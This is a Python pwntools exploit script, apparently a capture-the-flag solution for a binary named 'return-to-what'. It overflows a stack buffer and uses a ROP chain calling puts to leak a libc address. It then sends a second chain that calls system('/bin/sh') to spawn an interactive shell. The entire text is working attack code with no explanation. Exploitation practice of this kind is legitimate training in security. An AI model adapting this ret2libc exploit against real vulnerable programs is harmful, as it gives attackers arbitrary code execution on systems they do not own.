#!/usr/bin/python3
from pwn import *
context.arch = 'amd64'
e = ELF("./return-to-what")
p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
    #+"\nbreak *0x"
    +"\nc"
    )
payload=b"A"*56
p.recvuntil(b"\n")
p.recvuntil(b"\n")
rop = ROP(e)
rop.call(e.symbols["puts"], [e.got['puts']])
rop.call(e.symbols["vuln"])

payload = [
        b"A"*56,
        rop.chain()
        ]
payload = b"".join(payload)
p.sendline(payload)

puts = u64(p.recvuntil("\n").rstrip().ljust(8, b'\x00'))
log.info(f"found ya at {hex(puts)}")
libc = ELF("libc6_2.19-4ubuntu1_amd64.so")
libc.address = puts - libc.symbols["puts"]
log.info(f"sss {hex(libc.address)}")
rop = ROP(libc)
rop.call(libc.symbols["system"],[next(libc.search(b"/bin/sh\x00"))] )
rop.call(libc.symbols["exit"])

payload = [
         b"A"*56,
         rop.chain()
]


payload = b"".join(payload)

with open("payload","wb") as h:
    h.write(payload)

p.sendline(payload)



p.interactive()


